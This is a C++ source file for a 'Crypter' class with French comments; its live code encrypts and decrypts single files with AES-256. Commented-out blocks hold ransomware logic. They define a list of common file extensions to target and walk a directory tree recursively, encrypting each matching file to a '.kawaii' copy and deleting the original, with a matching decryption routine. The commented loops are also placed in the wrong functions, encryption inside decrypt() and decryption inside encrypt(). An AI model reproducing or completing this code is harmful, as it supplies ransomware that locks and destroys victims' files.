//
// Created by Romain BAYLE on 01/04/2024.
//

#include "crypter.h"
#include <iostream>
#include <fstream>
#include <string>
#include "AES_256.hpp"
#include <filesystem>
#include <utility>
#include <vector>
#include <cstdio>
#include <cstdlib>
#include <ctime>

#define BUFFER_SIZE 1024*1024

namespace fs = std::filesystem;

Crypter::Crypter(std::string  directoryPath,std::string key)
        : directoryPath_(std::move(directoryPath)) , key_(std::move(key))// Initialisation du chemin du dossier
{
}
void Crypter::clearMemory(void* ptr, size_t size) {
    // Utilisation de std::fill pour remplir la mémoire avec des zéros
    std::fill(static_cast<unsigned char*>(ptr), static_cast<unsigned char*>(ptr) + size, 0);
}

// Appel de cette méthode après avoir fini d'utiliser la clé
// Par exemple, dans le destructeur de votre classe Crypter

Crypter::~Crypter() {
    // Efface la mémoire utilisée par la clé et le vecteur d'initialisation (iv)
    clearMemory((void*)this->key_.data(), this->key_.size());
    clearMemory((void*)this->iv_.data(), this->iv_.size());
}
/*
bool Crypter::isTargetExtension(const std::string& filePath) {
    std::vector<std::string> targetExtensions = {".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".zip", ".rar", ".exe", ".js", ".php", ".html", ".htm", ".txt", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp3", ".mp4", ".avi", ".log", ".xml", ".csv", ".dat",".bin"};

    std::string fileExtension = fs::path(filePath).extension().string();
    for (const std::string& ext : targetExtensions) {
        if (fileExtension == ext) {
            return true;
        }
    }
    return false;
}
*/
void Crypter::decrypt(char *key_init, char *input_file, char *output_file) {
    ByteArray key, dec;
    size_t file_len;

    FILE *input, *output;

    srand(time(0));



    size_t key_len = 0;
    while(key_init[key_len] != 0)
        key.push_back(key_init[key_len++]);

    input = fopen(input_file, "rb");
    if (input == 0) {
        fprintf(stderr, "Cannot read file '%s'\n", input_file);
        exit(1);
    }

    output = fopen(output_file, "wb");
    if (output == 0) {
        fprintf(stderr, "Cannot write file '%s'\n", output_file);
        exit(1);
    }

    AES_256 aes(key);

    fseeko64(input, 0, SEEK_END);
    file_len = ftell(input);
    fseeko64(input, 0, SEEK_SET);
    printf("File is %zd bytes\n", file_len);
    if(file_len >1) {

        aes.decrypt_start(file_len);

        while (!feof(input)) {
            unsigned char buffer[BUFFER_SIZE];
            size_t buffer_len;

            buffer_len = fread(buffer, 1, BUFFER_SIZE, input);
            printf("Read %zd bytes\n", buffer_len);
            if (buffer_len > 0) {
                dec.clear();
                aes.decrypt_continue(buffer, buffer_len, dec);
                fwrite(dec.data(), dec.size(), 1, output);
            }
        }

        dec.clear();
        aes.decrypt_end(dec);
        fwrite(dec.data(), dec.size(), 1, output);

        fclose(input);
        fclose(output);
    }


    /* for (const auto& entry : fs::recursive_directory_iterator(this->directoryPath_)) {
         if (fs::is_regular_file(entry.path())) {
             std::string filePath = entry.path().string();

             if (isTargetExtension(filePath)) {
                 std::string encryptedFilePath = filePath + ".kawaii"; // Ajouter l'extension ".kawaii"

                 std::string content = readFromFile(filePath);
                 std::string encryptedContent = encryptAES(content);
                 writeToFile(encryptedFilePath, encryptedContent);

                 fs::remove(filePath); // Supprimer le fichier original
             }
         }
     }*/
}

void Crypter::encrypt(char* key_init , char* input_file , char* output_file) {
    ByteArray key, enc;
    size_t file_len;

    FILE *input, *output;

    srand(time(0));



    size_t key_len = 0;
    while(key_init[key_len] != 0)
        key.push_back(key_init[key_len++]);

    input = fopen(input_file, "rb");
    if (input == 0) {
        fprintf(stderr, "Cannot read file '%s'\n", input_file);
        exit(1);
    }

    output = fopen(output_file, "wb");
    if (output == 0) {
        fprintf(stderr, "Cannot write file '%s'\n", output_file);
        exit(1);
    }

    AES_256 aes(key);

    fseeko64(input, 0, SEEK_END);
    file_len = ftell(input);
    fseeko64(input, 0, SEEK_SET);
    printf("File is %zd bytes\n", file_len);
    if(file_len > 1 ) {

        enc.clear();
        aes.encrypt_start(file_len, enc);
        fwrite(enc.data(), enc.size(), 1, output);

        while (!feof(input)) {
            unsigned char buffer[BUFFER_SIZE];
            size_t buffer_len;

            buffer_len = fread(buffer, 1, BUFFER_SIZE, input);
            printf("Read %zd bytes\n", buffer_len);
            if (buffer_len > 0) {
                enc.clear();
                aes.encrypt_continue(buffer, buffer_len, enc);
                fwrite(enc.data(), enc.size(), 1, output);
            }
        }

        enc.clear();
        aes.encrypt_end(enc);
        fwrite(enc.data(), enc.size(), 1, output);

        fclose(input);
        fclose(output);
    }





    /* for (const auto& entry : fs::recursive_directory_iterator(this->directoryPath_)) {
         if (fs::is_regular_file(entry.path())) {
             std::string filePath = entry.path().string();
             if (fs::path(filePath).extension() == ".kawaii") { // Vérifier si l'extension est ".kawaii"
                 std::string decryptedFilePath = filePath.substr(0, filePath.size() - 7); // Retirer l'extension ".kawaii"

                 std::string encryptedContent = readFromFile(filePath);
                 std::string decryptedContent = decryptAES(encryptedContent);
                 writeToFile(decryptedFilePath, decryptedContent);

                 fs::remove(filePath); // Supprimer le fichier chiffré

                 // Récupérer l'extension d'origine
                 std::string originalExtension = fs::path(decryptedFilePath).extension().string();
                 // Renommer le fichier déchiffré avec l'extension d'origine
                 fs::rename(decryptedFilePath, decryptedFilePath.substr(0, decryptedFilePath.size()-originalExtension.size()) + originalExtension);
             }
         }
     }*/
}
/*
std::string Crypter::readFromFile(const std::string &filePath) {
    std::ifstream file(filePath, std::ios::binary);
    std::string content;

    if (file.is_open()) {
        content.assign((std::istreambuf_iterator<char>(file)), (std::istreambuf_iterator<char>()));
        file.close();
    } else {
        std::cerr << "Impossible d'ouvrir le fichier : " << filePath << std::endl;
    }

    return content;
}

std::string Crypter::encryptAES(const std::string &input) {
    std::string encryptedText;

    try {
        CryptoPP::AES::Encryption aesEncryption(reinterpret_cast<const CryptoPP::byte*>(this->key_.data()), 32);
        CryptoPP::CBC_Mode_ExternalCipher::Encryption cbcEncryption(aesEncryption, reinterpret_cast<const CryptoPP::byte*>(this->iv_.data()));

        CryptoPP::StringSource(input, true, new CryptoPP::StreamTransformationFilter(cbcEncryption, new CryptoPP::StringSink(encryptedText)));
    } catch (const CryptoPP::Exception& e) {
        std::cerr << "Erreur lors du chiffrement : " << e.what() << std::endl;
    }

    return encryptedText;
}

std::string Crypter::decryptAES(const std::string &encryptedText) {
    std::string decryptedText;

    try {
        CryptoPP::AES::Decryption aesDecryption(reinterpret_cast<const CryptoPP::byte*>(this->key_.data()), 32);
        CryptoPP::CBC_Mode_ExternalCipher::Decryption cbcDecryption(aesDecryption, reinterpret_cast<const CryptoPP::byte*>(this->iv_.data()));

        CryptoPP::StringSource(encryptedText, true, new CryptoPP::StreamTransformationFilter(cbcDecryption, new CryptoPP::StringSink(decryptedText)));
    } catch (const CryptoPP::Exception& e) {
        std::cerr << "Erreur lors du déchiffrement : " << e.what() << std::endl;
    }

    return decryptedText;
}

void Crypter::writeToFile(const std::string &filePath, const std::string &content) {
    std::ofstream file(filePath, std::ios::binary);
    if (file.is_open()) {
        file.write(content.c_str(), content.size());
        file.close();
    } else {
        std::cerr << "Impossible d'écrire dans le fichier : " << filePath << std::endl;
    }
}*/